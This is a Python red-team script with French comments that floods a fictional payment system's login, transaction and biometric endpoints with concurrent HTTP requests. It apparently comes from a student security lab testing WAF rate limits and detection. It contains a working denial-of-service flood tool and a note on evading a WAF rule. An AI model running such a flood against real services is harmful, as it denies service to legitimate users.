#!/usr/bin/env python3
"""Scénario Red Team — déni de service applicatif contrôlé (flood HTTP).

Trois scénarios, tous limités au SI fictif de l'équipe (sujet §3.4 / §9) :

  business (défaut) : mélange POST /auth/login (vérif mot de passe -> base, d'où
                      ↑ auth_login_failures_total) et POST /api/transactions
                      (rejeté en 401 faute de jeton : charge le WAF + l'API, pas
                      la base). Sature le CHEMIN MÉTIER du paiement (↑ req/s,
                      ↑ p95, ↑ 429) -> détection `dos_flood`. Le MODE DÉGRADÉ qui
                      s'ensuit (virements LÉGITIMES mis en file puis rejoués) se
                      démontre avec une vraie transaction cliente PENDANT
                      l'attaque, pas via ce flood. Plus crédible qu'un flood sur
                      /api/health, qui ne touche ni l'auth ni la base.

  face              : POST /api/auth/login/face -> éprouve la zone WAF stricte de
                      la biométrie (2 r/s). On doit voir SURTOUT des 429 : preuve
                      que la limite tient et que l'auto-inscription/biométrie
                      résiste à une force brute.

  health            : GET /api/health -> flood léger (ne sollicite pas le métier),
                      conservé pour comparaison / sanity-check.

Périmètre strict : uniquement le SI fictif de l'équipe (sujet §3.4 / §9).

Usage :
    python3 flood.py --target http://192.168.137.1:8080 --duration 40 --workers 50
    python3 flood.py --target http://192.168.137.1:8080 --scenario face
"""

from __future__ import annotations

import argparse
import itertools
import json
import threading
import time
import urllib.error
import urllib.request
from collections import Counter

_stats = Counter()
_lock = threading.Lock()

# Base64 brut d'un PNG minimal (PAS de préfixe `data:` ni `;base64,` : ceux-ci
# sont flaggés par le CRS -> 403, ce qui masquerait la limite de débit). Ainsi la
# requête PASSE le CRS, atteint la zone WAF `face` et s'y fait limiter (429),
# ce qui est précisément ce qu'on veut prouver. Les rares requêtes qui passent la
# limite sont rejetées par l'API en 401/403 (pas de jeton `face_pending`), avant
# tout calcul biométrique -> la plupart n'atteignent jamais l'API (429 au WAF).
_FAKE_IMG = (
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="
)


def _specs(scenario: str) -> list[tuple[str, str, dict | None]]:
    """Specs de requêtes (méthode, chemin, corps JSON|None) par scénario."""
    if scenario == "health":
        return [("GET", "/api/health", None)]
    if scenario == "face":
        return [("POST", "/api/auth/login/face", {"image": _FAKE_IMG})]
    # business : le vrai chemin du paiement (auth + API métier)
    return [
        ("POST", "/auth/login", {"username": "attaquant", "password": "mauvais"}),
        ("POST", "/api/transactions", {"src_account": 1, "dst_account": 2, "amount": "1.00"}),
    ]


def _send(target: str, method: str, path: str, body: dict | None) -> int:
    data = None
    headers: dict[str, str] = {}
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(target + path, data=data, headers=headers, method=method)
    with urllib.request.urlopen(req, timeout=3) as resp:
        return resp.status


def _worker(target: str, specs: list[tuple[str, str, dict | None]], stop: threading.Event) -> None:
    local: Counter = Counter()
    cycle = itertools.cycle(specs)
    while not stop.is_set():
        method, path, body = next(cycle)
        try:
            code = _send(target, method, path, body)
            local[f"{path} {code}"] += 1
        except urllib.error.HTTPError as exc:
            local[f"{path} {exc.code}"] += 1
        except Exception:
            local[f"{path} error"] += 1
    with _lock:
        _stats.update(local)


def main() -> None:
    p = argparse.ArgumentParser(description="Flood HTTP contrôlé (chemin métier / biométrie)")
    p.add_argument("--target", required=True, help="URL du WAF, ex. http://192.168.137.1:8080")
    p.add_argument(
        "--scenario",
        choices=["business", "face", "health"],
        default="business",
        help="business=paiement (défaut), face=biométrie (2 r/s), health=léger",
    )
    p.add_argument("--duration", type=int, default=40, help="durée en secondes")
    p.add_argument("--workers", type=int, default=50, help="threads concurrents")
    args = p.parse_args()

    target = args.target.rstrip("/")
    specs = _specs(args.scenario)
    print(f"[flood] cible={target} scénario={args.scenario} durée={args.duration}s workers={args.workers}")
    print("        endpoints : " + ", ".join(f"{m} {path}" for m, path, _ in specs))

    stop = threading.Event()
    threads = [
        threading.Thread(target=_worker, args=(target, specs, stop)) for _ in range(args.workers)
    ]
    for t in threads:
        t.start()

    time.sleep(args.duration)
    stop.set()
    for t in threads:
        t.join()

    total = sum(_stats.values())
    print(f"[flood] terminé — {total} requêtes envoyées")
    for key, n in sorted(_stats.items()):
        print(f"        {key}: {n}")


if __name__ == "__main__":
    main()
